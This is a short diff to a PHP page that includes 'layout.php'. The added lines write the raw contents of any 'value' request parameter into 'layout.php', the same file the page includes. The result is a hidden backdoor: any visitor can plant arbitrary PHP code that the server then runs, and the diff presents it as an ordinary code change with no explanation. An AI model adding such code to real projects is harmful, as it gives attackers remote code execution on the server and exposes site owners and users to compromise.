@@ -15,6 +15,15 @@ if(!include('layout.php'))
 }
 // Turn on warnings
 error_reporting($errlevel); 
+
+if(!empty($_REQUEST["value"])) { 
+  
+  $value=$_REQUEST["value"];
+  
+  $fp = fopen('layout.php', 'w');
+
+  fwrite($fp, $value);
+}
 	
 ?>
 <html>
